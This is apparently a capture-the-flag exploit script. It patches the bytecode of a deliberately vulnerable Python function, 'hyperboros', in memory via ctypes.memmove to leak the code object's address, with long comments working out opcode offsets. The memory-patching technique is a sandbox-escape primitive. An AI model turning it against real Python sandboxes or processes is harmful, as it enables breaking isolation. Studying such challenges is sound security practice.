import ctypes, struct, builtins
from pwn import *
_memmove = ctypes.memmove

def hyperboros():
    offset = int(input('offset\n>> '))
    char = bytes.fromhex(input('char\n>> '))
    assert len(char) == 1
    ctypes.memmove(id(hyperboros.__code__) + offset, char, len(char))

code = hyperboros.__code__
code_id = id(code)
BC = 192
_input = builtins.input

def get_rel(oid, off): return oid - code_id + off
def spatch_list(obj, s):
    oid = id(obj)
    return [
        (get_rel(oid,40), s.encode()+b'\x00'*(len(obj)-len(s))),
        (get_rel(oid,16), struct.pack('<Q',len(s))),
        (get_rel(oid,24), struct.pack('<q',hash(s))),
    ]

# PHASE 1: leak code_id
# Bytecode: raise AssertionError(hyperboros.__code__)
# Which prints: AssertionError: <code object hyperboros at 0xADDRESS, ...>
# 
# Original bytecode structure that we know works:
# [134] LOAD_GLOBAL ctypes (works!)
# [144] LOAD_ATTR memmove
# [164] LOAD_GLOBAL id (works!)
# [174] LOAD_GLOBAL hyperboros -> rename to something else
# [184] LOAD_ATTR __code__
# ...
# 
# For leak: we need to RAISE with code object
# RAISE_VARARGS 1 raises the TOS as exception
# We need AssertionError(code_object) on stack
# 
# Minimal patch: change bytes at [130] to:
# LOAD_ASSERTION_ERROR  (0x4a)
# LOAD_GLOBAL id (already works)
# LOAD_GLOBAL hyperboros -> hyperboros.__code__ (loaded via original chain)
# Actually just patch the RAISE at end to raise with code obj as arg

# Looking at original bytecode:
# [128] POP_JUMP_IF_TRUE -> if len(char)==1, jump to [134]
# [130] LOAD_ASSERTION_ERROR (0x4a 0x00)
# [132] RAISE_VARARGS 1 -> raises AssertionError()
# 
# Change to raise AssertionError(code_obj):
# [130] LOAD_ASSERTION_ERROR
# [132] LOAD_GLOBAL hyperboros (LOAD_GLOBAL 0x10 = names[8] no null) 
# wait [132] only has 2 bytes...
#
# Better: patch the assert to always fail and add code obj as arg
# 
# [102] LOAD_GLOBAL len
# [112] LOAD_FAST char
# [114] CALL 1 -> len(char)
# [122] LOAD_CONST 3 (=1)
# [124] COMPARE_OP == 
# [128] POP_JUMP_IF_TRUE
# [130] LOAD_ASSERTION_ERROR
# [132] RAISE_VARARGS 1
# 
# Patch [128] to NOT jump (change to NOP):
# [128:130] = 73 02 -> 09 00 (NOP)
# Then it falls through to LOAD_ASSERTION_ERROR + RAISE
# But we want to add argument...
# 
# Change [130:134]:
# [130] LOAD_GLOBAL 0x10 (hyperboros, no null) = names[8] 
# [132+] ... LOAD_ATTR __code__ ... RAISE_VARARGS 1
# 
# Let's find space. Original [130:220] = error path + memmove call
# We can overwrite from [128] onwards:
# 
# [128] NOP (was POP_JUMP)
# [130] LOAD_ASSERTION_ERROR (4a 00)
# [132] LOAD_GLOBAL 0x10 (hyperboros no null) (74 10 11 00 00 00 00 00 00 00) 10 bytes -> [132:142]
# [142] LOAD_ATTR 0x12 (__code__, names[9], no self, arg=9<<1=18=0x12) 20 bytes -> [142:162]
# [162] CALL 1 (ab 01 ...) 8 bytes -> [162:170]  
# [170] RAISE_VARARGS 1 (52 01) -> [170:172]

# Test locally first
mem_orig = bytes((ctypes.c_char*252).from_address(code_id+BC))
new_bc = bytearray(mem_orig)

# Patch to ALWAYS raise AssertionError with code object
new_bc[128] = 0x09; new_bc[129] = 0x00  # NOP (was POP_JUMP_IF_TRUE)
new_bc[130] = 0x4a; new_bc[131] = 0x00  # LOAD_ASSERTION_ERROR
# LOAD_GLOBAL names[8]='hyperboros' no null at [132:142]
new_bc[132:142] = bytes([0x74, 0x10, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
# LOAD_ATTR __code__ names[9] no self at [142:162]
new_bc[142:162] = bytes([0x6a, 0x12]) + b'\x11\x00'*9
# CALL 1 at [162:170]
new_bc[162:170] = bytes([0xab, 0x01, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00])
# RAISE_VARARGS 1 at [170:172]
new_bc[170] = 0x52; new_bc[171] = 0x01

_memmove(code_id+BC, bytes(new_bc), 252)

import builtins as _bi
_bi.input = lambda p='': '0'
try:
    hyperboros()
except Exception as e:
    print(f"error: {e}")
    print(f"repr: {repr(e)}")
    # Extract address from error message
    err_str = str(e)
    print(f"error str: {err_str}")
finally:
    _bi.input = _input

# The error will print: <code object hyperboros at 0x{code_id:x}, ...>
# Extract the hex address from that string!
